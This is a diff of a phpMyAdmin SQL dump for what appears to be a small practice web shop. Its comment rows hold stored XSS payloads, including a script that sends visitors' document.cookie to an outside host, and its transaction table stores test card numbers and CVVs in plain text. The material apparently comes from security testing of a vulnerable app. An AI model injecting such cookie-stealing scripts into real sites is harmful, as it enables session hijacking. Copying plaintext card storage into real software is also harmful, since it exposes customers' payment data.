@@ -3,7 +3,7 @@
 -- http://www.phpmyadmin.net
 --
 -- Host: localhost
--- Generation Time: May 04, 2014 at 06:35 PM
+-- Generation Time: May 04, 2014 at 10:56 PM
 -- Server version: 5.6.16
 -- PHP Version: 5.4.24
 
@@ -87,7 +87,7 @@ INSERT INTO `product_comments` (`id`, `productid`, `email`, `comment`) VALUES
 (6, 11, 'nana', '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%68%69%22%29%3C%2F%73%63%72%69%70%74%3E'),
 (7, 11, 'df', '<script>alert("hi")</script>'),
 (8, 11, 'df', '<script>alert("hi")</script>'),
-(9, 3, '', '<script>new Image().src="http://good.site/attacks/showimage.php?param="+document.cookie</script>'),
+(9, 3, '', '<script>new Image().src="http://good.site/iamgood/showimage.php?"+document.cookie</script>'),
 (10, 3, '', '');
 
 -- --------------------------------------------------------
@@ -98,14 +98,24 @@ INSERT INTO `product_comments` (`id`, `productid`, `email`, `comment`) VALUES
 
 CREATE TABLE IF NOT EXISTS `transaction` (
   `id` int(10) NOT NULL AUTO_INCREMENT,
-  `uid` int(10) NOT NULL,
+  `uid` varchar(100) NOT NULL,
   `prodid` int(10) NOT NULL,
   `timedate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
-  `ccnumber` int(16) NOT NULL,
-  `cvvnumber` int(4) NOT NULL,
+  `ccnumber` varchar(32) NOT NULL,
+  `cvvnumber` varchar(10) NOT NULL,
   `expiry` varchar(10) NOT NULL,
+  `qty` int(11) NOT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
+) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;
+
+--
+-- Dumping data for table `transaction`
+--
+
+INSERT INTO `transaction` (`id`, `uid`, `prodid`, `timedate`, `ccnumber`, `cvvnumber`, `expiry`, `qty`) VALUES
+(1, 'kk@kk.two', 5, '2014-05-04 22:01:31', '1231231231234455', '123', '04/21/2019', 3),
+(2, 'kk@kk.two', 5, '2014-05-04 22:01:47', '1231231231234455', '123', '04/21/2019', 3),
+(3, 'kk@kk.two', 5, '2014-05-04 22:02:20', '1231231231234455', '123', '04/21/2019', 3);
 
 -- --------------------------------------------------------
 
